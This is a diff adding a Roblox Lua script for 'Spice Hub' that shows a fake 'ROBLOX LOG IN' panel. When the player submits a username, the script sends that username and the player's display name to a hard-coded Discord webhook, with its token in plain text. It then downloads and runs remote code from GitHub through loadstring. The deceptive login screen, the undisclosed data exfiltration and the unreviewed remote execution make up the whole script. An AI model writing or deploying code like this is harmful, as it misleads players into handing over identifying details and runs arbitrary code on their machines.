@@ -1,0 +1,59 @@
+-- Login.lua (Spice Hub Login with Discord Webhook)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "SpiceHubLogin"
+
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(1, 0, 0.2, 0)
+Title.Text = "ROBLOX LOG IN"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 24
+
+local TextBox = Instance.new("TextBox", Frame)
+TextBox.Position = UDim2.new(0.1, 0, 0.4, 0)
+TextBox.Size = UDim2.new(0.8, 0, 0.2, 0)
+TextBox.PlaceholderText = "Enter Username"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.new(1,1,1)
+TextBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+TextBox.BorderSizePixel = 0
+
+local Submit = Instance.new("TextButton", Frame)
+Submit.Position = UDim2.new(0.1, 0, 0.7, 0)
+Submit.Size = UDim2.new(0.8, 0, 0.2, 0)
+Submit.Text = "Login"
+Submit.TextColor3 = Color3.new(1,1,1)
+Submit.BackgroundColor3 = Color3.fromRGB(100,0,0)
+Submit.BorderSizePixel = 0
+Submit.Font = Enum.Font.GothamBold
+Submit.TextSize = 18
+
+Submit.MouseButton1Click:Connect(function()
+	local inputUsername = TextBox.Text
+
+	-- Send to webhook
+	local HttpService = game:GetService("HttpService")
+	local url = "https://discord.com/api/webhooks/1396821008282943488/FE6m9c1qdeNu7Pljt0LvGUJHFojSokIybrX133WTppr6KlMnp9ggd7eL6cq2vmG2NtYp"
+
+	local data = {
+		["username"] = "Spice Hub Logger",
+		["content"] = "**New Login Attempt**\nUsername: `" .. inputUsername .. "`\nDisplayName: `" .. LocalPlayer.DisplayName .. "`"
+	}
+
+	local jsonData = HttpService:JSONEncode(data)
+	HttpService:PostAsync(url, jsonData)
+
+	wait(1)
+	ScreenGui:Destroy()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/aikolang/Spice-Hub/main/spicey%20hub/Main.lua"))()
+end)
